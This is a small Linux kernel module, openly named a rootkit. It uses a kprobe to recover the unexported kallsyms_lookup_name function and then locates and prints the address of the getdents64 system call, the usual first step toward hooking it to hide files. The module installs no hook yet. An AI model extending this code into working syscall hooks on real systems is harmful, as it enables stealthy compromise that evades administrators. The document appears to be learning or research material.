#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/ftrace.h>
#include <linux/kprobes.h>

// Define the prototype for our symbol searching function
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
kallsyms_lookup_name_t kallsyms_lookup_name_fn = NULL;

int init_rootkit(void)
{
    pr_info("[rootkit] - Hello\n");

    // Register a kprobe to find our symbol searching function
    struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name",
    };

    register_kprobe(&kp);
    kallsyms_lookup_name_fn = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);

    // Use our symbol search function to find __x64_sys_getdents64
    unsigned long a = kallsyms_lookup_name_fn("__x64_sys_getdents64");

    pr_info("[rootkit] kallsyms_lookup_name = %px\n", kallsyms_lookup_name_fn);
    pr_info("[rootkit] __x64_sys_getdents64 = 0x%px\n", (char*)a);
    
    return 0;
}

void exit_rootkit(void)
{
    pr_info("[rootkit] - Bye\n");
}

module_init(init_rootkit);
module_exit(exit_rootkit);
MODULE_LICENSE("GPL");
